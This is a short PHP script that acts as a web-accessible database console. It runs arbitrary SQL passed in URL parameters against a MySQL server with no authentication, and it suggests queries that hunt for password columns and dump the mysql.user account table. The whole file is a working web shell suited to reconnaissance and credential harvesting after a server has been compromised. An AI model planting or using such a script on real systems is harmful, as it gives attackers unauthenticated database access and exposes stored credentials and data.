<pre>
Connect to mysql database using ext/mysql (PHP < 5.5):
Args:
  - host (localhost)
  - port (3306)
  - user 
  - pass
  - db: schema name
  - sql
<?php
  /*
    Useful commands
  */
  if( empty( $_GET["sql"] ) ){
    echo "SELECT @@version\n";
    echo "SELECT * FROM information_schema.columns where column_name like '%pass%'\n";
    echo "SHOW TABLES\n";
    echo "SELECT * FROM mysql.user\n";
    exit;
  }
  if( empty( $_GET["host"] ) ) $_GET["host"] = 'localhost';
  $conn = mysql_connect( $_GET["host"], $_GET["user"], $_GET["pass"] );
  if( !$conn ) die("Failed to connect to ".$_GET["host"] );
  mysql_select_db( $_GET["db"] );
  $rlt = mysql_query( $_GET["sql"], $conn );
  echo "Info: ".mysql_info()."\n";
  echo "Error: ".mysql_error()."\n";
  echo "Rows: ".mysql_num_rows( $rlt )."\n";
  echo "Affected rows: ".mysql_affected_rows( $conn )."\n";
  echo "Results:\n";
  $count = 0;
  while( $row = mysql_fetch_assoc( $rlt ) ){
    if( $count == 0 ){
      echo "<table><tr>";
      foreach( $row as $k => $v ){
        echo "<th>$k</th>";
      }
      echo "</tr>\n";
    }
    echo "<tr>";
    foreach( $row as $k => $v ){
      echo "<td>".htmlentities($v)."</td>";
    }
    echo "</tr>\n";
    $count++;
  }
  echo "</table>";
?>
</pre>
